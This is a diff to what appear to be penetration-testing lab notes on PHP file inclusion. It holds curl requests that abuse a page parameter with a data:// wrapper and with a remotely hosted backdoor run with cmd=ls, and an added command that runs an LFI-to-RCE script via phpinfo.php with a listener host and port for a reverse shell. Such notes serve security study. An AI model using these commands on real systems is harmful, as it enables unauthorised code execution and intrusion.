@@ -52,3 +52,8 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64
 curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
 ```
 >we need to be aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the allow_url_include7 setting needs to be enabled
+
+### RCE via phpinfo.php
+```
+python3 lfito_rce.py -l "http://192.168.45.224:8000/lfito_rce.py?file=" --lhost 192.168.45.224 --lport 9001  -t 12  -i "http://192.168.151.55/dashboard/phpinfo.php"
+```
